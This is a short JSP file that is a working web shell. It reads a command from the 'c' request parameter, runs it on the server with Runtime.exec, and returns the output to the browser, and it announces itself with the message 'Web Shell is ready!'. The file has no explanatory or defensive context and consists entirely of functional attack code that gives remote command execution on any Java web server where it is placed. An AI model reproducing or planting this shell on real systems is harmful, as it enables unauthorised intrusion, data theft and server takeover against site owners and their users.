<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("c");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream i = p.getInputStream();
        int b;
        while ((b = i.read()) != -1) {
            out.print((char)b);
        }
    } else {
        out.print("Web Shell is ready! Use ?c=your_command");
    }
%>